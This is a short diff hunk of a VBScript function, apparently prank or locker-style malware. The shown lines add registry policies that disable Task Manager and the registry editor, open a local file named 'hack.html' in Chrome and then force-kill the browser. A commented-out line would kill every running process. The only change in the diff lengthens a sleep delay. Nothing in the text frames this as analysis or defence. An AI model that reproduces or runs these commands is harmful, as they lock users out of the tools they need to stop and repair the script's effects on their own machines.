@@ -8,7 +8,7 @@ Function run()
     shell.run "reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableTaskMgr /t REG_DWORD /d 1 /f"
     shell.run "reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableRegistryTools /t REG_DWORD /d 1 /f"
    shell.run "chrome " & fso.GetParentFolderName(WScript.ScriptFullName) & "hack.html"
-  wscript.sleep 1000
+  wscript.sleep 3000
   shell.run "taskkill /f /im chrome.exe"
     ' shell.run "taskkill /f /im *"
 End Function
